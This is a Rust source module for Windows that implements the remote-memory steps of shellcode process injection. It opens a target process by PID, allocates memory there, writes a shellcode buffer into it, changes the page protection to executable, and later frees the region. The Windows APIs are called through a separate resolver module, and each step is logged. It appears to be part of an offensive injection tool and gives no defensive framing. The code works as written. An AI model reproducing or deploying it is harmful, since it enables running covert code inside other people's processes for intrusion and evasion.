#[cfg(windows)]
use crate::log::LogSink;

#[cfg(windows)]
const MEM_COMMIT: u32 = 0x1000;
#[cfg(windows)]
const MEM_RESERVE: u32 = 0x2000;
#[cfg(windows)]
const MEM_RELEASE: u32 = 0x8000;
#[cfg(windows)]
const PAGE_READWRITE: u32 = 0x04;
#[cfg(windows)]
const PAGE_EXECUTE_READ: u32 = 0x20;
#[cfg(windows)]
const PROCESS_VM_OPERATION: u32 = 0x0008;

#[cfg(windows)]
pub fn free_remote(process: *mut std::ffi::c_void, base: *mut std::ffi::c_void, log: &LogSink) {
    log.detail("[cleanup] Free remote memory");
    unsafe {
        let _ = crate::resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE);
    }
}

#[cfg(windows)]
pub fn cleanup(pid: u32, remote_base: u64, size: usize, log: &LogSink) {
    log.step(format!(
        "[CLEANUP] Freeing {} bytes at 0x{:X} in PID {}",
        size, remote_base, pid
    ));
    let process = unsafe { crate::resolve::OpenProcess(PROCESS_VM_OPERATION, 0, pid) };
    if process.is_null() {
        log.error("process open failed".to_string());
        return;
    }
    let base = remote_base as *mut std::ffi::c_void;
    let result = unsafe { crate::resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
    unsafe { crate::resolve::CloseHandle(process) };
    if result != 0 {
        log.step("[CLEANUP] Remote memory freed successfully.");
    } else {
        log.error("[CLEANUP] remote memory free failed".to_string());
    }
}

#[cfg(windows)]
pub fn write_remote_payload(
    process: *mut std::ffi::c_void,
    shellcode: &[u8],
    total_steps: u32,
    log: &LogSink,
) -> Result<*mut std::ffi::c_void, String> {
    let size = shellcode.len();

    log.step(format!("[2/{}] Allocate remote memory", total_steps));
    let base = unsafe {
        crate::resolve::VirtualAllocEx(
            process,
            std::ptr::null(),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if base.is_null() {
        return Err(
            "remote allocation failed (check privileges)".to_string(),
        );
    }
    log.info(format!(
        "      allocated RW region at remote address {:#p} ({} bytes)",
        base, size
    ));

    log.step(format!("[3/{}] Write {} bytes", total_steps, size));
    let mut written: usize = 0;
    let ok = unsafe {
        crate::resolve::WriteProcessMemory(
            process,
            base as *const std::ffi::c_void,
            shellcode.as_ptr() as *const std::ffi::c_void,
            size,
            &mut written,
        )
    };
    if ok == 0 {
        free_remote(process, base, log);
        return Err("remote write failed".to_string());
    }
    log.info(format!("      wrote {} bytes", written));

    log.step(format!("[4/{}] Set memory protection", total_steps));
    let mut old_protect: u32 = 0;
    let ok = unsafe {
        crate::resolve::VirtualProtectEx(
            process,
            base as *const std::ffi::c_void,
            size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };
    if ok == 0 {
        free_remote(process, base, log);
        return Err("memory protection change failed".to_string());
    }
    log.info(format!(
        "      remote page is now PAGE_EXECUTE_READ (previous protection: {:#x})",
        old_protect
    ));

    Ok(base)
}

#[cfg(not(windows))]
pub fn cleanup(_pid: u32, _remote_base: u64, _size: usize, log: &crate::log::LogSink) {
    log.error("Cleanup requires Windows — this build is running on a non-Windows host");
}
